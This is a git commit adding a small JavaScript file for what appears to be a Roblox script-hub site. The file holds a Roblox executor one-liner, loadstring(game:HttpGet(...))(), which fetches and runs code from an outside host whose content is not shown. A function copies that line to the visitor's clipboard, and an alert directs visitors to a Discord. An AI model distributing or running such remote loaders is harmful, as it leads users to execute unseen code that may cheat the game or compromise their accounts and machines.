30a2d61f95853998754ab794df4bc001a00761d6
Sap <162757246+Scaroontop@users.noreply.github.com>
2026-04-21 21:09:46 -0400

    Create Site.js

---
+++ Assets/Site.js
@@ -0,0 +1,5 @@
+var script = 'loadstring(game:HttpGet("https://redstoneguard.xyz/api/loader/4d470bde-d3bd-49b6-9ba4-70ecec825e88/init"))()';
+function myFunction() {
+  navigator.clipboard.writeText(script);   
+}
+alert("Warning: Script isn't completed instead join the Discord. This is for those that came from Google, somewhere else, or just didn't know.")
